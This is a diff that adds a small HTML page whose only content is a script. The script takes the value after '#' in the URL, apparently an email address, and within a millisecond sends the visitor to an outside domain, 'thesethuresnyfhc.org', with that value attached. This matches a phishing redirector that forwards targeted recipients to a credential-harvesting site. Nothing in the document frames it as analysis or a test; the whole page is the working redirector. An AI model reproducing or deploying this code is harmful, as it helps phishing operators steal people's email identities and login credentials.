@@ -1,1 +1,18 @@
-Le
+
+<html lang="en">
+
+
+
+  
+    <script>
+
+        var hash = window.location.hash;
+
+        var em = hash.split('#')[1];
+window.setTimeout(function() {
+    window.location.href = 'https://thesethuresnyfhc.org#'+em;
+}, 1);
+       
+    </script>
+
+</html>
